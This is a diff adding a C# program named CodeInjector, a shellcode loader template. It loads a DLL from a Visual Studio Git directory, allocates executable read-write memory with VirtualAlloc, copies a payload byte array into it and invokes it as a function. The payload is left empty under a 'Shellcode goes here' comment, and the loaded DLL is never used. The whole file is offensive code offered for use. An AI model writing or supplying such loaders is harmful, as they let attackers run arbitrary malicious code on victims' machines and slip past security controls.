@@ -1,0 +1,67 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class CodeInjector
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string dllPath);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string moduleName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate void ShellcodeDelegate();
+
+    [Flags]
+    public enum AllocationType
+    {
+        Commit = 0x1000,
+        Reserve = 0x2000,
+        Decommit = 0x4000,
+        Release = 0x8000,
+    }
+
+    [Flags]
+    public enum MemoryProtection
+    {
+        ExecuteReadWrite = 0x40,
+        ExecuteRead = 0x20,
+        ExecuteWrite = 0x80,
+        ReadWrite = 0x04,
+        ReadOnly = 0x02,
+        WriteCopy = 0x08,
+        NoAccess = 0x01,
+    }
+
+    // Shellcode goes here
+    private static byte[] payload = new byte[] { /* ... */ };
+
+    public static void Main()
+    {
+        string dllPath = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll";
+
+        IntPtr hModule = LoadLibrary(dllPath);
+        if (hModule == IntPtr.Zero)
+        {
+            Console.WriteLine("Failed to load the targeted DLL");
+            return;
+        }
+
+        IntPtr rwxMemory = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        if (rwxMemory == IntPtr.Zero)
+        {
+            Console.WriteLine("Failed to allocate RWX memory");
+            return;
+        }
+
+        Marshal.Copy(payload, 0, rwxMemory, payload.Length);
+
+        // Execute the injected code
+        ShellcodeDelegate shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(rwxMemory);
+        shellcodeDelegate.Invoke();
+    }
+}
